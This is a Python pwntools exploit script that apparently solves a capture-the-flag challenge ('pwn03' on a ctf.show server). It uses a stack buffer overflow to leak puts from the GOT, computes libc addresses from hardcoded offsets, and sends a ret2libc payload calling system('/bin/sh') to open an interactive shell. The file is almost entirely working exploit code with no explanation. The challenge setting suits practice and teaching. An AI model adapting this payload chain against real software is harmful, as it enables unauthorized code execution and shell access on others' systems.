# -*- coding: utf-8 -*-


import pwn
from pwn import *
fileName = './pwn03'

'''
[*] '/home/wkyuu/Desktop/temp/pwn03'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
'''

p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32

context(log_level='debug', os='linux')
# p = process(fileName)
p = remote('pwn.challenge.ctf.show', 28103)
elf = ELF(fileName)

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))

gdbscript = '''
b *pwnme+21
b *pwnme+26
c
'''
# gdb.attach(p, gdbscript = gdbscript)

# bin
bin_func_main = elf.sym['main']
bin_puts_got = elf.got['puts']
bin_puts_plt = elf.sym['puts']
bin_ret = 0x8048342

# libc
libc_puts_offset = 0x67360
libc_system_offset = 0x3cd10
libc_str_bin_sh_offset = 0x17b8cf

# libc_puts_offset = 0x70ea0
# libc_system_offset = 0x47040
# libc_str_bin_sh_offset = 0x1b40ce

# leak_libc
logger('leak_libc')
payload = b'a' * (0x9 + 0x4) + p32(bin_puts_plt) + p32(bin_func_main) + p32(bin_puts_got)
p.sendlineafter(b'32bits\n\n', payload)

leak_puts = u32(p.recv(4))
libc_base = leak_puts - libc_puts_offset
libc_system = libc_base + libc_system_offset
libc_str_bin_sh = libc_base + libc_str_bin_sh_offset

logger('leak_puts', hex(leak_puts), 'a')
logger('libc_base', hex(libc_base), 'a')
logger('libc_system', hex(libc_system), 'a')
logger('libc_str_bin_sh', hex(libc_str_bin_sh), 'a')

# rop
logger('rop')
payload = b'a' * (0x9 + 0x4) + p32(libc_system) + p32(0) + p32(libc_str_bin_sh)
p.sendlineafter(b'32bits\n\n', payload)
p.interactive()
